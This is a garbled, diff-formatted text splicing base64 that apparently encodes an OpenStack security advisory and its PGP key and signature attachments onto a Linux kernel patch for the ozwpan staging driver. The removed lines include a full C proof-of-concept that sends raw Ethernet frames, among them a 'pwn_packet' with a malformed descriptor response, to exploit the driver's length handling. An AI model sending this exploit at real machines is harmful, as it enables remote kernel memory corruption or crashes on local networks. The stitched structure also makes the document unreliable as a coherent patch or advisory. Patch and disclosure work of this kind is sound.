+bmRldi5vcmcvOTkwNDg5ICgyMDI2LjIvaGliaXNjdXMpDQoNCg0KQ3JlZGl0cw0Kfn5+fn5+fg0K
+LSBCb3JpcyBCb2Jyb3YgZnJvbSBTQVAgU0UgKENWRS0yMDI2LTQyOTk4LCBDVkUtMjAyNi00Mjk5
+OSwgQ1ZFLTIwMjYtNDMwMDApDQotIFRpbSBTaGVwaGVyZCBmcm9tIHJvaWFpLmNhIChDVkUtMjAy
+Ni00MzAwMSkNCi0gRXJpY2hlbiBmcm9tIEluc3RpdHV0ZSBvZiBDb21wdXRpbmcgVGVjaG5vbG9n
+eSwgQ2hpbmVzZSBBY2FkZW15IG9mIA0KU2NpZW5jZXMgKENWRS0yMDI2LTQ0Mzk0KQ0KLSBBcnRl
+bSBHb25jaGFyb3YgZnJvbSBTeXNFbGV2ZW4gR21iSA0KDQoNClJlZmVyZW5jZXMNCn5+fn5+fn5+
+fn4NCi0gaHR0cHM6Ly9sYXVuY2hwYWQubmV0L2J1Z3MvMjE0ODM5OA0KLSBodHRwczovL2xhdW5j
+aHBhZC5uZXQvYnVncy8yMTQ4NDc3DQotIGh0dHBzOi8vbGF1bmNocGFkLm5ldC9idWdzLzIxNDk3
+NzUNCi0gaHR0cHM6Ly9sYXVuY2hwYWQubmV0L2J1Z3MvMjE0OTc4OQ0KLSBodHRwczovL2xhdW5j
+aHBhZC5uZXQvYnVncy8yMTUwMDg5DQotIGh0dHBzOi8vbGF1bmNocGFkLm5ldC9idWdzLzIxNTAz
+NzkNCi0gaHR0cDovL2N2ZS5taXRyZS5vcmcvY2dpLWJpbi9jdmVuYW1lLmNnaT9uYW1lPUNWRS0y
+MDI2LTQyOTk4DQotIGh0dHA6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFt
+ZT1DVkUtMjAyNi00Mjk5OQ0KLSBodHRwOi8vY3ZlLm1pdHJlLm9yZy9jZ2ktYmluL2N2ZW5hbWUu
+Y2dpP25hbWU9Q1ZFLTIwMjYtNDMwMDANCi0gaHR0cDovL2N2ZS5taXRyZS5vcmcvY2dpLWJpbi9j
+dmVuYW1lLmNnaT9uYW1lPUNWRS0yMDI2LTQzMDAxDQotIGh0dHA6Ly9jdmUubWl0cmUub3JnL2Nn
+aS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAyNi00NDM5NA0KDQoNCk5vdGVzDQp+fn5+fg0K
+LSBUaGUgZml4IGZvciBDVkUtMjAyNi00Mjk5OSBtb2RpZmllcyB0aGUgdHJ1c3QgcG9saWN5IHN0
+cnVjdHVyZS4NCiAgIERlcGxveW1lbnRzIHdpdGggY3VzdG9taXplZCB0cnVzdCBwb2xpY2llcyBt
+YXkgZXhwZXJpZW5jZSBpc3N1ZXMgd2l0aA0KICAgaW1hZ2UgdXBsb2FkIGFuZCBIZWF0IHNlcnZp
+Y2UgZnVuY3Rpb25hbGl0eSB1bnRpbCB0aGUgY3VzdG9tIHBvbGljeSBpcw0KICAgdXBkYXRlZC4N
+Ci0gQ1ZFLTIwMjYtNDQzOTQgb25seSBhZmZlY3RzIGRlcGxveW1lbnRzIHVzaW5nIFNBTUwyIG9y
+IE9JREMNCiAgIGZlZGVyYXRpb24uDQoNCg0KLS0NCkdvdXRoYW0gUGFjaGEgUmF2aSAoZ291dGhh
+bXIpDQpPcGVuU3RhY2sgVnVsbmVyYWJpbGl0eSBNYW5hZ2VtZW50IFRlYW0NCmh0dHBzOi8vc2Vj
+dXJpdHkub3BlbnN0YWNrLm9yZy92bXQuaHRtbA0K
 
-static int hex2num(char c)
-{
-	if (c >= '0' && c <= '9')
-		return c - '0';
-	if (c >= 'a' && c <= 'f')
-		return c - 'a' + 10;
-	if (c >= 'A' && c <= 'F')
-		return c - 'A' + 10;
-	return -1;
-}
-static int hwaddr_aton(const char *txt, uint8_t *addr)
-{
-	int i;
-	for (i = 0; i < 6; i++) {
-		int a, b;
-		a = hex2num(*txt++);
-		if (a < 0)
-			return -1;
-		b = hex2num(*txt++);
-		if (b < 0)
-			return -1;
-		*addr++ = (a << 4) | b;
-		if (i < 5 && *txt++ != ':')
-			return -1;
-	}
-	return 0;
-}
+--------------Rbi492AYNQGihbJwrVUTTIOv
+Content-Type: application/pgp-keys; name="OpenPGP_0x0638DAD3B82C3988.asc"
+Content-Disposition: attachment; filename="OpenPGP_0x0638DAD3B82C3988.asc"
+Content-Description: OpenPGP public key
+Content-Transfer-Encoding: quoted-printable
 
-int main(int argc, char *argv[])
-{
-	if (argc < 3) {
-		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
-		return 1;
-	}
+-----BEGIN PGP PUBLIC KEY BLOCK-----=0A=
+=0A=
+xsFNBGm7HhsBEAC4jWG7snWqax8fazd7QVADjLRxhNKOAyVrBqBffI5CuSuafwtq=0A=
+V1s3x8C7GzNjklTuCXcX7iZAU7g5y0fZtT6lp1l3l1xUtKPcBF0DCd5JH/HP/MH8=0A=
+eBByL3sNRR3RHovAVpUhxT0RGcltm5wbnwE37dcrIRbVl66xbcyaUnHokUhdShSb=0A=
+SptiPPOkncn/i10uGAIHN884Bt/zZkUpak9PMTFNXThDYU+79csw6roxH/AV6mtD=0A=
+xDG6wKf8VcFg538a8deJsPUNONrdOYwjH4xAYao5yrktALQC2zEbHLmNZnFRHJ6z=0A=
+Gs7zOGN6kLV6ueqfzkkWjPGXkcCeIL4mX3K9mRaW0L6QwKh0n2grWs264dD5bV/r=0A=
+PIxhRDHNfp5rMBRPb3rStEqDkqZ8MMuCETZQUwQYa9vccj7diXOa+YvWehaE4Ito=0A=
+Nd6+PD9I6mB0VwVDpdxmwgEqR+wG30OTaPSfyq4GQ3z/A783Wyx9vuSI4R2iRSSg=0A=
+HuyiaFnRZMIOu5ib0dTuY+/MBmMxSpcU+tre+DedXmCNksLfD9HsHyJMx/OGTWYQ=0A=
+dYmavnRtBN+dzwku9SrisCMfAOuDvTvri4csxTRfomNYhUWODGqWum/sV253lh5q=0A=
+5J/H6xHVhANTQ3vVU1EYGBJszPxx+aTlFye9oo1/06Lv+U3nYdNDMzaYNwARAQAB=0A=
+zStHb3V0aGFtIFBhY2hhIFJhdmkgPGdvdXRoYW1wcmF2aUBnbWFpbC5jb20+wsGz=0A=
+BBMBCABdFiEEwo5Vl+U+phfaPpN5Bjja07gsOYgFAmm7HhsbFIAAAAAABAAObWFu=0A=
+dTIsMi41KzEuMTIsMCwzAhsDBQkDwmcABQsJCAcCAiICBhUKCQgLAgQWAgMBAh4H=0A=
+AheAAAoJEAY42tO4LDmIhTwQAKt30GA/0UnV9uvioUeyBJp1GnGN1lcXNQYIFOB+=0A=
+TbjMthdYScRTHY28l/gKSuvTtV+DuTvrOS0UPZ7HC72SijE3AJOQGE1YMTToxdxi=0A=
+OCv++R/3Sth4zogHPVlJPn4mIry/8OX7cchxnwuPGtdrH2H31IxSIeW2FWSSGd7K=0A=
+rY/IncJOQeN4wOXpEi+gbNGGrnyEJj3J0pz+8Fx2MugdMGP7zmLMN8UEIY7XBGx6=0A=
+U96ri35iCMsosdiuUylUXTDufJf+VvA66gGNy063KM8mzkdJHTVzdcJjFTS4FemF=0A=
+97dBu2FR8sgsiiaFiNVs1KfHKcs2J2M+rVQQokpYARq7ayDLPPhVHV4bXk1kuS4p=0A=
+l6EeSGz0Xp6LXD6YuwcG87vUDD6IJDQY2YqRedYkaOF0hvwuIihDMwWBtuRLNdgl=0A=
+MNGFnf++euaQBqfQT9W6mQqFGQ+hkLsTPo/nYjfVIcYRdGZEY+iydM3HaVr8UbB8=0A=
+vrnSGUFfW31PGJ/SVV3nJtWoygToacNzwUUwT3Y8VWFcfypC9hI856BDlvOlb7X0=0A=
+JBagdmgJqCWMAkKPPQNsS5xRcHTxnd8b63UrC4Vi4M423ThAByjERzYoGPmb/mJF=0A=
+tcZrGwTArUfwNKFEvDLt7gcZNIvuPWeTVWHgr4Suko3EkRTIL2w6TppylLJTi1jI=0A=
+yNMtzsFNBGm7HhsBEACw4nqhta7zFWEt/UpPEYkenWpbT2nVDtuKn1uELMCV+Sy8=0A=
+Jdcec9VKQm6q4y9xqkLuMT5y1x213dpPJVHegks8TJaFf3yaA+++QtqHP2biEaqk=0A=
+6HSpa5DIoGt95Uc58FVKiNQZ3w8bbna3Vrzy920WcBydKY6U2wemJf9hSdM4l15l=0A=
+ezk3HOnJaxKt+hTuaISUlEhZDQ3UtwdlKAWjcYkzkObVhZugZS8tWCpWsRq4eHcy=0A=
+hpxihTZFyKhGkKSu2W2Q+AgFr7TRvdW2/oIjaPSy7DeqH88STz3Nvzg9ztnqzQ5j=0A=
+DKWamnlrjbxllI77c9+fvp2lkt/9hQtQ0SP6amEoYxfckJ0Q2AVTb4ixk8/Xv77g=0A=
+fIDJQ4HoTyPF2CXVpV2V8RPFKhwwZcdcna7eyw+zTXrl6Grjj6P0olrBCzvwvFex=0A=
+3c2rqhWzZKZnIqH4QHDV4GPGO1BPsnHRe0j+ZhZ03EVS+IxOlaExiF/wIm7S7VgH=0A=
+ZjTBs3V9L+szy2gO73ms+yh7n1PrXw+nI38f3xqGyZCfCX5kNwAoB0+izqOD9Cy/=0A=
+syviXgwbtbmu35NIbmOk9yMPvHVO6o6JQlq9moNaXEn7N4abFWHKP4lvLe6Yn3av=0A=
+y8+byR8bZplYQbBTrEtjGanO9nNannlyFnEDvUoQQ3PozyyztzerC5z6uPSSIQAR=0A=
+AQABwsGYBBgBCABCFiEEwo5Vl+U+phfaPpN5Bjja07gsOYgFAmm7HhsbFIAAAAAA=0A=
+BAAObWFudTIsMi41KzEuMTIsMCwzAhsMBQkDwmcAAAoJEAY42tO4LDmIXqkP+gPE=0A=
+jSFIH4HYoEsBE2wBiJlS5bBMsmElFCYyRM1S4az/RS3FX8r2a+J58UuUeANs4wiZ=0A=
+/4iGlBvdYn7rwB1Yb2/LIO5Pcsc9UvWKv2fEbpIbc7GMvb8+egFfkn7pHSbOqHxV=0A=
+7Z+JRoXToxcIqmlZi43mz7hVdR0ei8WMBR5nKVE6Ixt47QHilQ5kLMCqVmNojFz/=0A=
+H6t5uhjs3X6oalsB5/AoeL0jH62Dd1NWq1vBaqKYBLHyNNATkl97VdAUgaFE28Q4=0A=
+Nx+as9AGY5sr6yBoHD+QjZwnNydR6uRCY7qD+mqQv9KbHhBLd7HqyjXY7tG7pPnP=0A=
+4XeNkiUUDwIv2sYUSEhN89R5kk1YDKQ14N2/43l7JGCvnll64iomqqmejykliW+T=0A=
+6HhpKYNTH9ldYpjGmcYo4y093DnEA8nCXwpa3HO17ZQ7nxlg00Y3Oo4WpSGwAlpI=0A=
+81y4shJtQGwrnHaqqfH4/obXwb3SOLsFCPF9fZxtXmlO1VOA5JaM8y6DIqBewPNA=0A=
+WNzZu3qeBJd716WXp1ivUjvFRLcCMU6GxOMTv7dz1GP3d/xG9/Lb/mBK78Lu6fPc=0A=
+nV7MQp38mYdfj9T1t0pu/GTDpG0AYRl124U8onEwl3KJzst8AO8G0kKyWdXR0cRe=0A=
++qGYa3LmV2soXmdh0GFZ5KFjVYvdtAgTRIrQIz/K=0A=
+=3Drf4K=0A=
+-----END PGP PUBLIC KEY BLOCK-----=0A=
 
-	uint8_t dest_mac[6];
-	if (hwaddr_aton(argv[2], dest_mac)) {
-		fprintf(stderr, "Invalid mac address.\n");
-		return 1;
-	}
+--------------Rbi492AYNQGihbJwrVUTTIOv--
 
-	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
-	if (sockfd < 0) {
-		perror("socket");
-		return 1;
-	}
+--------------Hted8dlcFMIll0u90uiF44t6--
 
-	struct ifreq if_idx;
-	int interface_index;
-	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
-	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
-		perror("SIOCGIFINDEX");
-		return 1;
-	}
-	interface_index = if_idx.ifr_ifindex;
-	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
-		perror("SIOCGIFHWADDR");
-		return 1;
-	}
-	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
+--------------PoQOSJlmBJu8XSWQjljebCy6
+Content-Type: application/pgp-signature; name="OpenPGP_signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="OpenPGP_signature.asc"
 
-	struct {
-		struct ether_header ether_header;
-		struct oz_hdr oz_hdr;
-		struct oz_elt oz_elt;
-		struct oz_elt_connect_req oz_elt_connect_req;
-	} __packed connect_packet = {
-		.ether_header = {
-			.ether_type = htons(OZ_ETHERTYPE),
-			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
-			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-		},
-		.oz_hdr = {
-			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
-			.last_pkt_num = 0,
-			.pkt_num = htole32(0)
-		},
-		.oz_elt = {
-			.type = OZ_ELT_CONNECT_REQ,
-			.length = sizeof(struct oz_elt_connect_req)
-		},
-		.oz_elt_connect_req = {
-			.mode = 0,
-			.resv1 = {0},
-			.pd_info = 0,
-			.session_id = 0,
-			.presleep = 35,
-			.ms_isoc_latency = 0,
-			.host_vendor = 0,
-			.keep_alive = 0,
-			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
-			.max_len_div16 = 0,
-			.ms_per_isoc = 0,
-			.up_audio_buf = 0,
-			.ms_per_elt = 0
-		}
-	};
+-----BEGIN PGP SIGNATURE-----
 
-	struct {
-		struct ether_header ether_header;
-		struct oz_hdr oz_hdr;
-		struct oz_elt oz_elt;
-		struct oz_get_desc_rsp oz_get_desc_rsp;
-	} __packed pwn_packet = {
-		.ether_header = {
-			.ether_type = htons(OZ_ETHERTYPE),
-			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
-			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-		},
-		.oz_hdr = {
-			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
-			.last_pkt_num = 0,
-			.pkt_num = htole32(1)
-		},
-		.oz_elt = {
-			.type = OZ_ELT_APP_DATA,
-			.length = sizeof(struct oz_get_desc_rsp)
-		},
-		.oz_get_desc_rsp = {
-			.app_id = OZ_APPID_USB,
-			.elt_seq_num = 0,
-			.type = OZ_GET_DESC_RSP,
-			.req_id = 0,
-			.offset = htole16(2),
-			.total_size = htole16(1),
-			.rcode = 0,
-			.data = {0}
-		}
-	};
+wsF5BAABCAAjFiEEwo5Vl+U+phfaPpN5Bjja07gsOYgFAmoYb2kFAwAAAAAACgkQBjja07gsOYhi
+/hAAjd1rEwNvuGUG/Zc8khEC4HZN7ppUQvyh0/wyzFA7vxSL9L+xZ6+p1vPrr11xlAmLYE+CSw4N
+iYX712mbOgQM77eYiwjT1Uz0RobxXHAlPDt4WY9Vr29g0oVfGnavtys/9rH0sMIRtEDXU3ceKP/d
+nIGK16SMJQy174QetdqK1NsvYISSElFQgSh4XPWlYMbXlfLT8Rq6kk8HViYHPrKj6IUMzfgR/vzT
+5ZXjNSxCjXfJ62xNtVTJPZAz49ELIK4oHm5CkDXw0FKkCpnBLsQ2PfSqFfeTS7MzNAMXsiRk5L5z
+yhvpaL0EsO4/bFK3jaTHhtF++xl2GgjCMM1EBe1OOkCdMcz/wO4Knuwypj3/HgNNcCn83IKqtxJv
+wZAy+Qm99OdUO6plAY5OOF7s1piG+dreWUyuUgS/BnSq4OSu0+C0AcKJfPj4thxKVIL5rotPxTw8
+YkCHNXlpBCSZS0IhvcUZy8KMpdgL+9g4weKStO5BvDz7QmqnRUj6kZwL+sI8A3kZkH25MYAu/FC6
+F5KrWi6GDEY6HglOJJBmPTSud4IZb2WIYy3yov/oiIxxQlU1GL7om0jrbdH2VvfeNfuhb+DZUYWe
+KEM4L0AbzjIfL4zkHTu6L3OCd5UQRpKCsILzPw6dktKCOvgGHxivt2f/VMJFf6xHcw4t34BZeAU6
+/D4=
+=MIWF
+-----END PGP SIGNATURE-----
 
-	struct sockaddr_ll socket_address = {
-		.sll_ifindex = interface_index,
-		.sll_halen = ETH_ALEN,
-		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
-	};
-
-	if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-		perror("sendto");
-		return 1;
-	}
-	usleep(300000);
-	if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
-		perror("sendto");
-		return 1;
-	}
-	return 0;
-}
-
-Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
----
- drivers/staging/ozwpan/ozhcd.c   | 8 ++++----
- drivers/staging/ozwpan/ozusbif.h | 4 ++--
- 2 files changed, 6 insertions(+), 6 deletions(-)
-
-diff --git a/drivers/staging/ozwpan/ozhcd.c b/drivers/staging/ozwpan/ozhcd.c
-index 5ff4716..784b5ec 100644
---- a/drivers/staging/ozwpan/ozhcd.c
-+++ b/drivers/staging/ozwpan/ozhcd.c
-@@ -746,8 +746,8 @@ void oz_hcd_pd_reset(void *hpd, void *hport)
- /*
-  * Context: softirq
-  */
--void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
--			int length, int offset, int total_size)
-+void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,
-+			u8 length, u16 offset, u16 total_size)
- {
- 	struct oz_port *port = hport;
- 	struct urb *urb;
-@@ -759,8 +759,8 @@ void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
- 	if (!urb)
- 		return;
- 	if (status == 0) {
--		int copy_len;
--		int required_size = urb->transfer_buffer_length;
-+		unsigned int copy_len;
-+		unsigned int required_size = urb->transfer_buffer_length;
- 
- 		if (required_size > total_size)
- 			required_size = total_size;
-diff --git a/drivers/staging/ozwpan/ozusbif.h b/drivers/staging/ozwpan/ozusbif.h
-index 4249fa3..d2a6085 100644
---- a/drivers/staging/ozwpan/ozusbif.h
-+++ b/drivers/staging/ozwpan/ozusbif.h
-@@ -29,8 +29,8 @@ void oz_usb_request_heartbeat(void *hpd);
- 
- /* Confirmation functions.
-  */
--void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status,
--	const u8 *desc, int length, int offset, int total_size);
-+void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status,
-+	const u8 *desc, u8 length, u16 offset, u16 total_size);
- void oz_hcd_control_cnf(void *hport, u8 req_id, u8 rcode,
- 	const u8 *data, int data_len);
- 
--- 
-2.3.6
-
+--------------PoQOSJlmBJu8XSWQjljebCy6--
